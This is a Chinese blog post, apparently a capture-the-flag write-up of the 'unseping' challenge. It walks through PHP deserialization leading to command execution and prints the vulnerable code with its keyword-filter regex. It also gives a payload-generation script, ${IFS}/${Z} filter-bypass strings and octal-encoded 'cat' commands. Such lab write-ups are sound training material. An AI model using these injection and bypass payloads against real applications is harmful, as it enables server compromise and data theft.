<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>攻防世界 | jiutu2003</title><meta name="author" content="jiutu2003"><meta name="copyright" content="jiutu2003"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="1.unseping打开  分析代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;?phphighlight_file(__FILE__)">
<meta property="og:type" content="article">
<meta property="og:title" content="攻防世界">
<meta property="og:url" content="https://jiutu2003.github.io/%E5%AE%9E%E6%88%98/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/index.html">
<meta property="og:site_name" content="jiutu2003">
<meta property="og:description" content="1.unseping打开  分析代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;?phphighlight_file(__FILE__)">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/735eceff91f2a291064f8242242c831b.jpg">
<meta property="article:published_time" content="2023-02-24T05:54:13.377Z">
<meta property="article:modified_time" content="2023-02-24T06:02:02.298Z">
<meta property="article:author" content="jiutu2003">
<meta property="article:tag" content="实战">
<meta property="article:tag" content="ctf">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/735eceff91f2a291064f8242242c831b.jpg"><link rel="shortcut icon" href="/img/242ae48778369e7a.jpg"><link rel="canonical" href="https://jiutu2003.github.io/%E5%AE%9E%E6%88%98/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '攻防世界',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-02-24 14:02:02'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/242ae48778369e7a.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/735eceff91f2a291064f8242242c831b.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="jiutu2003"><span class="site-name">jiutu2003</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">攻防世界</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-02-24T05:54:13.377Z" title="发表于 2023-02-24 13:54:13">2023-02-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-02-24T06:02:02.298Z" title="更新于 2023-02-24 14:02:02">2023-02-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%9E%E6%88%98/">实战</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%9E%E6%88%98/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/">攻防世界</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="攻防世界"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="1-unseping"><a href="#1-unseping" class="headerlink" title="1.unseping"></a>1.unseping</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221115190302784.png" alt="image-20221115190302784"></p>
<p>分析代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ease</span></span>&#123;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$method</span>;<span class="comment">//ping</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$args</span>;<span class="comment">//array(&#x27;&#x27;)</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span>&#123;<span class="comment">//创建对象时触发</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;method = <span class="variable">$method</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;args = <span class="variable">$args</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;<span class="comment">//对象销毁时触发</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">&quot;ping&quot;</span>))) &#123;<span class="comment">//如果ping匹配数组里有ping进入if  </span></span><br><span class="line">            <span class="comment">//这个决定了 $a = new ease(&quot;ping&quot;,array(&#x27;pwd&#x27;));的第一个参数ping</span></span><br><span class="line">            <span class="comment">//下面的函数也决定了第二个参数是 数组型array(&#x27;&#x27;)</span></span><br><span class="line">            <span class="title function_ invoke__">call_user_func_array</span>(<span class="keyword">array</span>(<span class="variable">$this</span>, <span class="variable">$this</span>-&gt;method), <span class="variable language_">$this</span>-&gt;args);</span><br><span class="line">            <span class="comment">//调用回调函数，并把一个数组参数作为回调函数的参数</span></span><br><span class="line">            <span class="comment">//被调用的函数 this之这个类 method 就是函数ping  参数是args</span></span><br><span class="line">            <span class="comment">//只针对php</span></span><br><span class="line">           <span class="comment">// call_user_func_array(array($ease,&quot;ping&quot;),array(&#x27;one&#x27;));</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ping</span>(<span class="params"><span class="variable">$ip</span></span>)</span>&#123;<span class="comment">//等于执行了ping(&quot;one&quot;) </span></span><br><span class="line">        <span class="comment">//ping的参数只有一个因此数组传一个参就好了</span></span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$ip</span>, <span class="variable">$result</span>);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$result</span>);<span class="comment">//貌似执行了这个$ip命令返回了结果</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|tac|php|ls)/&quot;</span>, <span class="variable">$str</span>, <span class="variable">$pat_array</span>)) &#123;</span><br><span class="line">            <span class="comment">//正则表达式()整体修饰|或&amp;或;或 或/或cat或flag或tac或php或ls 这都是liunx常用的一些执行命令</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$str</span>;<span class="comment">//绕过表达式 返回传参</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;don&#x27;t hack&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;<span class="comment">//执行unserialize()时，先会调用这个函数</span></span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable language_">$this</span>-&gt;args <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;<span class="comment">//遍历关联数组  foreach ($array as $key =&gt; $value)</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;args[<span class="variable">$k</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">waf</span>(<span class="variable">$v</span>);<span class="comment">//调用waf函数输入$v  //如果绕过waf本身的args不会变</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">​</span><br><span class="line">&#125;</span><br><span class="line">​</span><br><span class="line"><span class="variable">$ctf</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];<span class="comment">//post传参ctf=xxxx</span></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$ctf</span>));<span class="comment">//先对ctf进行base64解密 在反序列话</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">unserialize先检查__wakeup()存在的意义：常常初始化操作 或 连接数据库</span></span><br><span class="line"><span class="comment">(前提：有可利用的类）</span></span><br><span class="line"><span class="comment">常见的魔术方法</span></span><br><span class="line"><span class="comment">__construct()        //创建对象时触发</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">__destruct()        //对象销毁时触发</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">__call()        //在对象中调用不可访问的方法时触发</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">__callStatic()        //在静态中调用不可访问的方法时触发</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">__get()        //用于从不可访问的属性读取数据</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">__set()        //用于将数据写入不可访问的属性</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">__isset()        //在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">__unset()        //在不可访问的属性上使用unset()时触发</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">__invoke()        //当脚本尝试将对象调用为函数时触发</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">__wakeup()        //执行unserialize()时，先会调用这个函数</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">__sleep()        //执行serialize()时，先会调用这个函数*/</span></span><br><span class="line">*/</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>流程：</p>
<p>传参ctf——base64解密——进construct ()（带进去参数）(注意：这个之前传参创建对象的时候就执行了)——进入__wakeup（绕过正则表达式）——调用waf()——反序列化——destruct()——用call_user_func_array调用ping函数——ping</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">附：</span><br><span class="line">call_user_func_array ： 调用回调函数，并把一个数组参数作为回调函数的参数。</span><br><span class="line">返回回调函数的结果。如果出错的话就返回<span class="literal">FALSE</span></span><br><span class="line">普通使用：</span><br><span class="line"></span><br><span class="line">           <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$b</span>, <span class="variable">$c</span></span>) </span>&#123;  </span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$b</span>; </span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$c</span>; </span><br><span class="line"></span><br><span class="line">           &#125; </span><br><span class="line"></span><br><span class="line">          <span class="title function_ invoke__">call_user_func_array</span>(<span class="string">&#x27;a&#x27;</span>, <span class="keyword">array</span>(<span class="string">&quot;111&quot;</span>, <span class="string">&quot;222&quot;</span>)); </span><br><span class="line"></span><br><span class="line">          <span class="comment">//输出 111 222</span></span><br><span class="line"> </span><br><span class="line">调用类内部的方法：</span><br><span class="line"></span><br><span class="line">         Class ClassA &#123; </span><br><span class="line"></span><br><span class="line">                 <span class="function"><span class="keyword">function</span> <span class="title">bc</span>(<span class="params"><span class="variable">$b</span>, <span class="variable">$c</span></span>) </span>&#123; </span><br><span class="line"></span><br><span class="line">                  <span class="variable">$bc</span> = <span class="variable">$b</span> + <span class="variable">$c</span>; </span><br><span class="line"></span><br><span class="line">                  <span class="keyword">echo</span> <span class="variable">$bc</span>; </span><br><span class="line"></span><br><span class="line">                 &#125; </span><br><span class="line"></span><br><span class="line">            &#125; </span><br><span class="line"></span><br><span class="line">          <span class="title function_ invoke__">call_user_func_array</span>(<span class="keyword">array</span>(<span class="string">&#x27;ClassA&#x27;</span>,<span class="string">&#x27;bc&#x27;</span>), <span class="keyword">array</span>(<span class="string">&quot;111&quot;</span>, <span class="string">&quot;222&quot;</span>)); </span><br><span class="line"></span><br><span class="line">          <span class="comment">//输出  333 </span></span><br><span class="line">支持引用传递:</span><br><span class="line"></span><br><span class="line">          <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params">&amp;<span class="variable">$b</span></span>) </span>&#123; </span><br><span class="line"></span><br><span class="line">              <span class="variable">$b</span>++; </span><br><span class="line"></span><br><span class="line">          &#125; </span><br><span class="line"></span><br><span class="line">          <span class="variable">$c</span> = <span class="number">1</span>; </span><br><span class="line"> 		  <span class="title function_ invoke__">call_user_func_array</span>(<span class="string">&#x27;a&#x27;</span>, <span class="keyword">array</span>(&amp;<span class="variable">$c</span>)); </span><br><span class="line"></span><br><span class="line">          <span class="keyword">echo</span> <span class="variable">$c</span>;  <span class="comment">//输出 2 </span></span><br></pre></td></tr></table></figure>

<p>可以结合分析代码来回看</p>
<p>建立文件 本地测试</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ease</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$args</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;method = <span class="variable">$method</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;args = <span class="variable">$args</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// function __destruct()&#123;</span></span><br><span class="line"><span class="comment">//     if (in_array($this-&gt;method, array(&quot;ping&quot;))) &#123;</span></span><br><span class="line"><span class="comment">//         call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"><span class="comment">// &#125; </span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// function ping($ip)&#123;</span></span><br><span class="line"><span class="comment">//     exec($ip, $result);</span></span><br><span class="line"><span class="comment">//     var_dump($result);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// function waf($str)&#123;</span></span><br><span class="line"><span class="comment">//     if (!preg_match_all(&quot;/(\||&amp;|;| |\/|cat|flag|tac|php|ls)/&quot;, $str, $pat_array)) &#123;</span></span><br><span class="line"><span class="comment">//         return $str;</span></span><br><span class="line"><span class="comment">//     &#125; else &#123;</span></span><br><span class="line"><span class="comment">//         echo &quot;don&#x27;t hack&quot;;</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// function __wakeup()&#123;</span></span><br><span class="line"><span class="comment">//     foreach($this-&gt;args as $k =&gt; $v) &#123;</span></span><br><span class="line"><span class="comment">//         $this-&gt;args[$k] = $this-&gt;waf($v);</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"><span class="comment">// &#125;   </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctf</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$ctf</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ease</span>(<span class="string">&quot;ping&quot;</span>,<span class="keyword">array</span>(<span class="string">&#x27;pwd&#x27;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$b</span>);<span class="comment">//将打印出base64复制到post ctf参数中</span></span><br><span class="line">Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czozOiJwd2QiO319</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>发送</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221115194041019.png" alt="image-20221115194041019"></p>
<p>有用</p>
<p>把pwd改成ls，但是被过滤了，可以绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a = new ease(&quot;ping&quot;,array(&#x27;l$&#123;Z&#125;s&#x27;));</span><br></pre></td></tr></table></figure>

<p>发送</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221115194244884.png" alt="image-20221115194244884"></p>
<p>有用</p>
<p>执行ls flag_1s_here就好了 注意flag也要绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a = new ease(&quot;ping&quot;,array(&#x27;l$&#123;Z&#125;s$&#123;IFS&#125;f$&#123;Z&#125;lag_1$&#123;Z&#125;s_here&#x27;));</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221115194505182.png" alt="image-20221115194505182"></p>
<p>注意：${IFS}这个可以替代空格 如果是敲到的空格 会造成命令未执行成功返回空数组</p>
<p>执行cat flag_1s_here&#x2F;flag_831b69012c67b35f.php，并绕过</p>
<p>使用uncode编码</p>
<p>C代码改为Unicode编码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* code */</span></span><br><span class="line">    <span class="type">char</span> site[] = <span class="string">&quot;cat flag_1s_here/flag_831b69012c67b35f.php&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span> site / <span class="keyword">sizeof</span> site[<span class="number">0</span>]; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\\%o&quot;</span>,site[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行后结果为</p>
<p>\143\141\164\40\146\154\141\147\137\61\163\137\150\145\162\145\57\146\154\141\147\137\70\63\61\142\66\71\60\61\62\143\66\67\142\63\65\146\56\160\150\160</p>
